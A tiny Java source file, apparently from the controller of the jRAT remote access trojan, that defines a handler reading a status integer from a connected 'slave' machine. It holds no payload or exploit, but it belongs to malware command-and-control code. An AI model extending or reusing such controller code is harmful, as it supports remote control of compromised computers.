package jrat.controller.packets.incoming;

import jrat.controller.Slave;

public class Packet2Status implements IncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		int status = slave.readInt();
		slave.setStatus(status);
		
	}
}
